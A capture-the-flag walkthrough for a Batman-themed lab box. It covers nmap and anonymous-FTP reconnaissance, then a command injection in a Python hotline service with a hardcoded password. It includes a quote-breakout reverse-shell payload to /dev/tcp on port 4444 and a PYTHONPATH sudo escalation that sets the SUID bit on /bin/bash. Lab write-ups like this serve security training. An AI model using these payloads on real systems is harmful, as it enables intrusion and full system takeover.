# The Dark Knight's Hotline

## Intel

Scan the target with nmap:

```bash
nmap -Pn -sC -sV <ip>
```

**Output:**

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rwxr-xr-x    1 0        0            1115 Jul 23 13:42 alert.py
|_drwxrwxrwx    1 0        0            4096 Jul 23 13:42 logs [NSE: writeable]
22/tcp   open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
3000/tcp open  ppp?
| fingerprint-strings:
|   Gotham Hotline: Identify yourself.
|   Unauthorized signal. Transmission terminated.
```

Three ports stand out: FTP with anonymous login, SSH, and an unknown service on 3000 answering with `Gotham Hotline: Identify yourself.`

## Connect

Since there is a stp port, we can try to log in:

```bash
ftp <ip>
```

## Explore

Listing the root of the FTP share:

```bash
lftp <ip>:~> ls
-rwxr-xr-x    1 0        0            1115 Jul 23 13:42 alert.py
drwxrwxrwx    1 0        0            4096 Jul 23 13:42 logs
```

```bash
cat alert.py
```

**Output:**

```python
import os
import socket
import time

HOST = "0.0.0.0"
PORT = 3000

def handle_client(conn, addr):
    conn.send("Gotham Hotline: Identify yourself.\n$> ".encode("utf-8"))

    data = conn.recv(1024).strip().decode()

    if data == "G0th4mN33dsTh3B4t!":
        conn.send(b'Authorized signal. What is the emergency?\n$> ')
        alert_text = conn.recv(1024).strip().decode()
        os.system("bash -c 'echo %s > /opt/hotline/logs/report.txt'" % alert_text)
        conn.send(b"Alert received. Mobilizing Knightfall Protocol.\n")
        time.sleep(1)
        conn.send(b"Batmobile deployed.\n")
    else:
        conn.send(b"Unauthorized signal. Transmission terminated.\n")

    conn.close()
```

Two findings:

- The service on port 3000 authenticates with the hardcoded string `G0th4mN33dsTh3B4t!`
- After authenticating, `alert_text` is passed **unsanitized** straight into `os.system()`, wrapped inside single quotes — a textbook command injection.

## Exploit

Connect to the port with netcat:

```bash
nc <ip> 3000
```

Authenticate with the hardcoded password:

```
G0th4mN33dsTh3B4t!
```

Break out of the single-quoted `echo` and chain a reverse shell as the "emergency" message:

```bash
x'; bash -c 'bash -i >& /dev/tcp/<your_ip>/4444 0>&1' #

```

Start a listener beforehand on the attacking machine:

```bash
nc -lvnp 4444
```

## Shell

Since we got access to the person's shell , we can check what are their perms on the system : 

```bash
sudo -l
```

**Output:**

```
Matching Defaults entries for bruce on gotham:
    mail_badpass, env_keep+=PYTHONPATH, use_pty

User bruce may run the following commands on gotham:
    (root) NOPASSWD: /usr/bin/python3 /opt/scanner/gotham_scanner.py
```

## Privilege escalation

We can escalate perms using the `gothan_scanner.py` file since :
- it imports `re` and `time` when catting 
- the user can use sudo without passwd on the python file
- the user uses a `PYTHONPATH`

```bash
mkdir /tmp/dir
echo 'import os; os.system("chmod +s /bin/bash")' > /tmp/dir/re.py
sudo PYTHONPATH=/tmp/dir /usr/bin/python3 /opt/scanner/gotham_scanner.py
```

Now that we changed our permissions on bin/bash , we can ascend to root

```bash
/bin/bash -p
```

Since the file we research is called root.txt, we check the root and find the file.